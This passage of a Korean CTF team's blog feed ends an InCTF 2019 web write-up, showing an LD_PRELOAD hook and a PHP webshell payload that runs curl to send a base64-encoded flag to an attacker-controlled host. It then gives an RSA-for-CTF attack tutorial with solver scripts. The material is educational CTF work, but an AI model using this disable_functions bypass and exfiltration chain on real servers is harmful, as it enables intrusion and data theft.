class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">u_int <span class="title">getuid</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *command;</span><br><span class="line">command = getenv(<span class="string">"youngsin"</span>);</span><br><span class="line">system(command);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <strong>php payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/uploads/youngsin/webshell.php?0=putenv(&quot;LD_PRELOAD=/tmp/evil.so&quot;);putenv(&quot;youngsin=curl http://my_ip:9996/ -d id=`/readFlag|base64|tr -d &apos;\n&apos;`&quot;);mb_send_mail(&quot;a&quot;,&quot;a&quot;,&quot;a&quot;);</span><br></pre></td></tr></table></figure><p>해당 Payload를 실행하게되면 공격자 서버로 전송된 Flag를 획득할 수 있습니다.</p><p><strong><code>Flag = inctf{Ohh,you_are_the_ultimate_chainer,Bypassing_disable_function_wasn&#39;t_fun?:SpyD3r}</code></strong></p><h1 id="레퍼런스"><a href="#레퍼런스" class="headerlink" title="레퍼런스"></a>레퍼런스</h1><p><a href="https://www.php.net/manual/en/mbstring.installation.php" target="_blank" rel="noopener">https://www.php.net/manual/en/mbstring.installation.php</a><br><a href="https://www.php.net/manual/en/function.mb-send-mail.php" target="_blank" rel="noopener">https://www.php.net/manual/en/function.mb-send-mail.php</a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content:encoded>
      
      <comments>https://defenit.kr/2019/09/24/Web/%E3%84%B4%20WriteUps/InCTF_2019_Copy-Cat_Writeup/#disqus_thread</comments>
    </item>
    
    <item>
      <title>RSA for CTF</title>
      <link>https://defenit.kr/2019/09/24/Crypto/%E3%84%B4%20Research/RSA_for_CTF/</link>
      <guid>https://defenit.kr/2019/09/24/Crypto/%E3%84%B4%20Research/RSA_for_CTF/</guid>
      <pubDate>Tue, 24 Sep 2019 02:42:39 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;목차&quot;&gt;&lt;a href=&quot;#목차&quot; class=&quot;headerlink&quot; title=&quot;목차&quot;&gt;&lt;/a&gt;목차&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;RSA Key Gen&lt;/li&gt;
&lt;li&gt;RSA 암호화 및 복호화&lt;ul&gt;
&lt;li&gt;암호화&lt;/li&gt;
&lt;li&gt;복호화&lt;/li&gt;
        
      
      </description>
      
      <content:encoded><![CDATA[<h3 id="목차"><a href="#목차" class="headerlink" title="목차"></a>목차</h3><ul><li>RSA Key Gen</li><li>RSA 암호화 및 복호화<ul><li>암호화</li><li>복호화</li></ul></li><li>RSA 문제 종류<ul><li>d값 계산</li><li>낮은 지수 공격</li><li>n값 소인수 분해 및 DB 이용</li><li>위너 공격</li><li>하스타드 공격</li><li>선택 암호문 공격</li><li>p, q값이 비슷할 경우 n 값으로 p, q값 구하기</li></ul></li><li>레퍼런스</li><li>문서 역사</li></ul><hr><h3 id="RSA-Key-Gen"><a href="#RSA-Key-Gen" class="headerlink" title="RSA Key Gen"></a>RSA Key Gen</h3><ol><li><p><strong>p, q 선택</strong></p><ul><li><p>python에선 다음과 같이 p, q를 생성할 수 있다.</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>) <span class="comment"># 1024bit</span></span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p><strong>n 계산</strong></p><ul><li><strong>p와 q를 곱하면 n</strong>이 된다.</li></ul></li><li><p><strong>phi 계산</strong></p><ul><li><strong>(p-1)과 (q-1)을 곱하면 phi</strong>가 된다. </li></ul></li><li><p><strong>e 선택</strong></p><ul><li><strong>주로 65537</strong></li><li><strong>phi와 서로소</strong>인 수</li></ul></li><li><p><strong>d 계산</strong></p><ul><li><p>d = <script type="math/tex">e^{-1}</script> mod n</p><ul><li><strong>mod phi에 대한 e의 곱셈의 역원</strong></li></ul></li><li><p>python에서 d값을 계산하는 방법은 두가지이다.</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>) <span class="comment"># Crypto.Util.number</span></span><br><span class="line">q = getPrime(<span class="number">1024</span>) <span class="comment"># Crypto.Util.number</span></span><br><span class="line">phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = invert(e, phi) <span class="comment"># gmpy2</span></span><br></pre></td></tr></table></figure></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>) <span class="comment"># Crypto.Util.number</span></span><br><span class="line">q = getPrime(<span class="number">1024</span>) <span class="comment"># Crypto.Util.number</span></span><br><span class="line">phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = divm(<span class="number">1</span>, e, phi) <span class="comment"># gmpy2</span></span><br></pre></td></tr></table></figure></li><li><p><code>invert</code>는 곱셈의 역원을 구해주고 <code>divm</code>의 첫 번째 인자를 1로 지정해주면 역원을 구해주는 기능을 한다. (곱셈의 역원이란 곱했을 때 1이 나오는 수를 의미한다.)</p></li></ul></li></ul></li></ol><p>​    <strong>공개키(public key)  : <code>(e,n)</code></strong></p><p>​    <strong>개인키(private key): <code>(d,n)</code></strong></p><hr><h3 id="RSA-암호화-및-복호화"><a href="#RSA-암호화-및-복호화" class="headerlink" title="RSA 암호화 및 복호화"></a>RSA 암호화 및 복호화</h3><ul><li>암호화<ul><li>암호문 = <script type="math/tex">평문^e</script> mod n</li></ul></li><li>복호화<ul><li>평문 = <script type="math/tex">암호문^d</script> mod n</li></ul></li></ul><hr><h3 id="RSA-문제-종류"><a href="#RSA-문제-종류" class="headerlink" title="RSA 문제 종류"></a>RSA 문제 종류</h3><ul><li><p><strong>d값 계산</strong></p><ul><li><strong>p, q, e 값 등이 주어졌을 경우</strong> n값과 phi 값을 계산 가능하기 때문에 d 값을 계산하면 된다.</li><li><p>gmpy2의 <code>invert</code>또는 <code>divm</code>를 사용한다.</p><ul><li><strong>d = invert(e, phi)</strong></li><li><strong>d = divm(1, e, phi)</strong></li></ul></li><li><p>예시 코드 (문제에서 p, q, e, c가 주어졌다고 가정)</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">d = invert(e, phi) <span class="comment"># d = divm(1, e, phi)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'%x'</span> % pow(c, d, n)).decode(<span class="string">"hex"</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><ul><li><p><strong>낮은 지수 공격</strong></p><ul><li><p><strong>e 값과 매우 작고 n 값이 큰 경우</strong> 가능한 공격 방법</p></li><li><p>보통 <code>e 값은 3</code>인데, <strong>암호문의 세제곱근을 구하면 평문</strong>이 된다.</p></li><li><p>gmpy2의 <code>iroot</code> 또는 <code>cbrt</code>를 사용한다.</p><ul><li><strong>m = iroot(c, 3)[0]</strong></li><li><strong>m = cbrt(c)</strong></li></ul></li><li><p>예시 코드 (문제에서 c, e값이 주어졌고 e 값이 3이라고 가정)</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> local_context() <span class="keyword">as</span> ctx:</span><br><span class="line">    ctx.precision = <span class="number">3000</span></span><br><span class="line">    m = cbrt(c)</span><br><span class="line">    <span class="comment">#m = iroot(c, 3)[0]</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'%x'</span> % int(m)).decode(<span class="string">"hex"</span>)</span><br></pre></td></tr></table></figure></li><li><p><code>cbrt</code>는 세제곱근을 구해주는 함수고 <code>iroot</code>의 두 번째 인자를 3으로 주면 세제곱근을 구해준다. 하지만 iroot의 반환 값은 튜플이고 원하는 값은 0번째 있는 값이다.</p></li><li><p><code>ctx.precision</code> 값은 <strong>정밀도</strong>에 관한 값인데 만약 <strong>결과 값이 재대로 나오지 않는다면 해당 값을 더 높게 수정해서 정밀도를 올려야 한다.</strong></p></li></ul></li></ul></li></ul><ul><li><p><strong>n값 소인수 분해 및 DB 이용</strong></p><ul><li><p><strong>작은 수의 n</strong>과 e만 주어졌을 경우 또는 <strong>DB에 존재하는 소수</strong>인 경우 가능한 공격 방법</p></li><li><p>d 값을 구하기 위해서 phi 값이 필요하고 phi를 구하기 위하여 p, q 값이 필요한데, <strong>n이 작다면 소인수 분해를 통해서 p, q값을 계산</strong> 가능하다.</p></li><li><p>매우 큰 소수라서 소인수 분해는 못하지만 DB에 존재하는 소수면 바로 p, q 값을 구할 수 있다.</p></li><li><p>주로 웹 사이트를 이용한다.</p><ul><li><p>[ <a href="http://www.factordb.com/" target="_blank" rel="noopener">http://www.factordb.com/</a> ]</p></li><li><p>[ <a href="https://www.alpertron.com.ar/ECMC.HTM" target="_blank" rel="noopener">https://www.alpertron.com.ar/ECMC.HTM</a> ]</p></li></ul></li></ul></li></ul><ul><li><p><strong>위너 공격</strong></p><ul><li><p><strong>e 값이 매우 큰경우</strong> 가능한 공격 방법</p></li><li><p>e 값이 큰 경우 d 값이 작을 확률이 높고 이때 성립한다.</p></li><li><p>위너 공격을 해주는 소스 코드를 이용해서 d 값을 알아낼 수 있다.</p><ul><li><a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">https://github.com/pablocelayes/rsa-wiener-attack</a></li><li><code>git clone https://github.com/pablocelayes/rsa-wiener-attack.git</code> 명령으로 위너 공격 코드를 다운 받고 <code>RSAwienerHacker.py</code>를 조금 수정해서 사용한다.</li></ul></li><li><p>예시 코드 (n, e, c 값이 주어졌다고 가정)</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># RSAwienerHacker.py</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    n = </span><br><span class="line">    e = </span><br><span class="line">    c = </span><br><span class="line">    d = hack_RSA(e, n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'%x'</span> % pow(c, d, n)).decode(<span class="string">"hex"</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><ul><li><p><strong>하스타드 공격</strong></p><ul><li><p><strong>n값과 c 값이 3개씩 주어 지며 e 값이 작은 경우</strong>에 가능한 공격 방법</p></li><li><p>e 값은 주로 3이다.</p></li><li><p>하스타드 공격을 해주는 소스 코드를 이용해서 평문을 알아낼 수 있다.</p></li><li><p>예시 코드 (e, n1, n2, n3, c1, c2, c3이 주어졌다고 가정)</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t        RSA Hastad Attack         "</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t         JulesDT -- 2016          "</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t         License GNU/GPL          "</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chinese_remainder</span><span class="params">(n, a)</span>:</span></span><br><span class="line">    sum = <span class="number">0</span></span><br><span class="line">    prod = reduce(<span class="keyword">lambda</span> a, b: a*b, n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> n_i, a_i <span class="keyword">in</span> zip(n, a):</span><br><span class="line">        p = prod / n_i</span><br><span class="line">        sum += a_i * mul_inv(p, n_i) * p</span><br><span class="line">    <span class="keyword">return</span> sum % prod</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul_inv</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    b0 = b</span><br><span class="line">    x0, x1 = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">1</span>: <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> a &gt; <span class="number">1</span>:</span><br><span class="line">        q = a / b</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">        x0, x1 = x1 - q * x0, x0</span><br><span class="line">    <span class="keyword">if</span> x1 &lt; <span class="number">0</span>: x1 += b0</span><br><span class="line">    <span class="keyword">return</span> x1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_invpow</span><span class="params">(x,n)</span>:</span></span><br><span class="line">    high = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> high ** n &lt; x:</span><br><span class="line">        high *= <span class="number">2</span></span><br><span class="line">    low = high/<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> low &lt; mid <span class="keyword">and</span> mid**n &lt; x:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">elif</span> high &gt; mid <span class="keyword">and</span> mid**n &gt; x:</span><br><span class="line">            high = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> mid</span><br><span class="line">    <span class="keyword">return</span> mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseC</span><span class="params">(argv, index, verbose)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> string</span><br><span class="line">    file = open(argv[index],<span class="string">'r'</span>)</span><br><span class="line">    cmd = <span class="string">' '</span>.join(argv)</span><br><span class="line">    fileInput = <span class="string">''</span>.join(file.readlines()).strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'--decimal'</span> <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="keyword">if</span> verbose:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span>,fileInput</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"## Considered as decimal input"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">        <span class="keyword">return</span> long(fileInput)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">'--hex'</span> <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="keyword">if</span> verbose:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span>,fileInput</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"## Considered as hexadecimal input"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">        <span class="keyword">return</span> long(fileInput,<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">'--b64'</span> <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="keyword">if</span> verbose:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span>,fileInput</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"## Considered as base64 input"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">        <span class="keyword">return</span> long(binascii.hexlify(binascii.a2b_base64(fileInput)),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            fileInput = long(fileInput)</span><br><span class="line">            <span class="keyword">if</span> verbose:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">"##"</span>,fileInput</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"## Guessed as decimal input"</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">            <span class="keyword">return</span> long(fileInput)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">if</span> all(c <span class="keyword">in</span> string.hexdigits <span class="keyword">for</span> c <span class="keyword">in</span> fileInput):</span><br><span class="line">                <span class="keyword">if</span> verbose:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"##"</span>,fileInput</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"## Guessed as hexadecimal input"</span></span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">                <span class="keyword">return</span> long(fileInput,<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> verbose:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"##"</span>,fileInput</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"## Guessed as base64 input"</span></span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">                <span class="keyword">return</span> long(binascii.hexlify(binascii.a2b_base64(fileInput)),<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseN</span><span class="params">(argv,index)</span>:</span></span><br><span class="line">    file = open(argv[index],<span class="string">'r'</span>)</span><br><span class="line">    fileInput = <span class="string">''</span>.join(file.readlines()).strip()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fileInput = long(fileInput)</span><br><span class="line">        <span class="keyword">return</span> fileInput</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">        <span class="keyword">return</span> long(RSA.importKey(fileInput).__getattr__(<span class="string">'n'</span>))</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    e = </span><br><span class="line"></span><br><span class="line">    n1 = </span><br><span class="line">    n2 = </span><br><span class="line">    n3 = </span><br><span class="line"></span><br><span class="line">    c1 = </span><br><span class="line">    c2 = </span><br><span class="line">    c3 = </span><br><span class="line"></span><br><span class="line">    n = [n1,n2,n3]</span><br><span class="line">    a = [c1,c2,c3]</span><br><span class="line"></span><br><span class="line">    result = (chinese_remainder(n, a))</span><br><span class="line">    resultHex = str(hex(find_invpow(result,<span class="number">3</span>)))[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">""</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Decoded Hex :\n"</span>,resultHex</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"---------------------------"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"As Ascii :\n"</span>,resultHex.decode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"</span></span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><ul><li><p><strong>선택 암호문 공격</strong></p><ul><li><p><strong>원하는 암호문을 복호화 해주는 경우</strong> 가능한 공격 방법(<strong>단, flag는 복호화해주지 않음</strong>)</p></li><li><p><strong>평문의 곱은 암호문의 곱과 동일</strong>하다는 성질을 이용한다.</p></li><li><p>풀이 방법 (flag를 암호화한 값이 주어지고 암호화, 복호화 기능이 존재한다고 가정)</p><ol><li><p><strong>숫자 2를 암호화</strong> 한다.</p></li><li><p><strong>숫자 2를 암호화한 값과 flag를 암호화한 값을 곱한다.</strong></p></li><li><p>결과 값을 <strong>숫자 2로 나누면 플래그</strong>가 된다.</p></li></ol></li></ul></li></ul><ul><li><p><strong>p, q값이 비슷할 경우 n 값으로 p, q값 구하기</strong></p><ul><li><p>gmpy2 모듈의 <code>next_prime</code> 함수를 이용할 경우 p, q 값이 거의 차이가 나지 않는다.</p></li><li><p>이때 n 값만 주어져도 p, q값을 구할 수 있게 된다.</p></li><li><p>gmpy2의 <code>isqrt</code>와 <code>t_divmod</code>를 이용하면 된다.</p></li><li><p>예시 코드 (n 값과 e 값이 주어졌다고 가정)</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n =</span><br><span class="line">e = </span><br><span class="line">c =</span><br><span class="line"></span><br><span class="line">p = isqrt(n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    q, r = t_divmod(n, p)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    p += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'%x'</span> % pow(c, d, n)).decode(<span class="string">"hex"</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><hr><h3 id="레퍼런스"><a href="#레퍼런스" class="headerlink" title="레퍼런스"></a>레퍼런스</h3><p><a href="https://blog.naver.com/yjw_sz/221441769257" target="_blank" rel="noopener">https://blog.naver.com/yjw_sz/221441769257</a></p><p><a href="https://blog.naver.com/yjw_sz/221396346574" target="_blank" rel="noopener">https://blog.naver.com/yjw_sz/221396346574</a></p><p><a href="https://xerxes-break.tistory.com/341" target="_blank" rel="noopener">https://xerxes-break.tistory.com/341</a></p><hr><h3 id="문서역사"><a href="#문서역사" class="headerlink" title="문서역사"></a>문서역사</h3><p><code>2019-09-24</code> <strong>JSec: 최초 작성</strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content:encoded>
      
      <comments>https://defenit.kr/2019/09/24/Crypto/%E3%84%B4%20Research/RSA_for_CTF/#disqus_thread</comments>
    </item>
    
    <item>
      <title>ARM_기초</title>
      <link>https://defenit.kr/2019/09/20/Rev/%E3%84%B4%20Research/ARM_%EA%B8%B0%EC%B4%88/</link>
      <guid>https://defenit.kr/2019/09/20/Rev/%E3%84%B4%20Research/ARM_%EA%B8%B0%EC%B4%88/</guid>
      <pubDate>Fri, 20 Sep 2019 05:12:57 GMT</pubDate>
      <description>
      
        
        
          &lt;h1 id=&quot;목차&quot;&gt;&lt;a href=&quot;#목차&quot; class=&quot;headerlink&quot; title=&quot;목차&quot;&gt;&lt;/a&gt;목차&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;ARM (Advanced Risc Machine)&lt;/li&gt;
&lt;li&gt;Thumb 모드 / ARM 모드&lt;ul&gt;
&lt;li&gt;A
        
      
      </description>
      
